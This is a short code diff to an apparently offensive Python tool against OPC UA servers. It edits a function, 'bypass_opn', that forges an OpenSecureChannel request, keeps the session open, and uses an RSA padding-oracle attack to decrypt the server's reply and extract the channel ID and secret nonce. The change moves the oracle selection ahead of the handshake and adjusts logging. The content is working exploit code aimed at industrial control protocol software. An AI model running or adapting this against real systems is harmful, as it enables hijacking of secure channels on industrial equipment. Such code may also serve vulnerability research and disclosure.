@@ -1228,16 +1228,18 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
     with cache.open('w') as outfile:
       json.dump(cachedata, outfile)
   
+  log('Picking a padding oracle for decryption.')
+  oracle, oracle_ep = find_padding_oracle(impersonate_endpoint.endpointUrl, opn_oracle, password_oracle, timing_threshold)
+  
   log('Performing the OPN handshake...')
   login_sock = connect_and_hello(lhost, lport)
   opn_reply = opc_exchange(login_sock, opn_req)
   
   log_success('Forged OPN request was accepted. Now keeping this session open while decrypting the first block of the response.')
-  oracle, oracle_ep = find_padding_oracle(impersonate_endpoint.endpointUrl, opn_oracle, password_oracle, timing_threshold)
   cipherblocksize = certificate_publickey(oracle_ep.serverCertificate).size_in_bytes()
   assert len(opn_reply.encodedPart) % cipherblocksize == 0
-  
   decrypted = rsa_decryptor(oracle, oracle_ep.serverCertificate, opn_reply.encodedPart[:cipherblocksize])
+  
   log_success(f'Success! Got the following plaintext: {hexlify(decrypted).decode()}')
   unpadded = remove_rsa_padding(decrypted, login_endpoint.securityPolicyUri)
   if not unpadded:
@@ -1246,7 +1248,7 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
   # Assuming response fits in single plaintext block.
   log('Removed padding. Now parsing OpenSecureChannelResponse to extract channel ID and secret nonce:')
   opn_resp, _ = openSecureChannelResponse.from_bytes(encodedConversation.from_bytes(unpadded)[0].requestOrResponse)
-  log_object(opn_resp)
+  log_object('openSecureChannelResponse', opn_resp)
   
   return ChannelState(
     sock=login_sock,
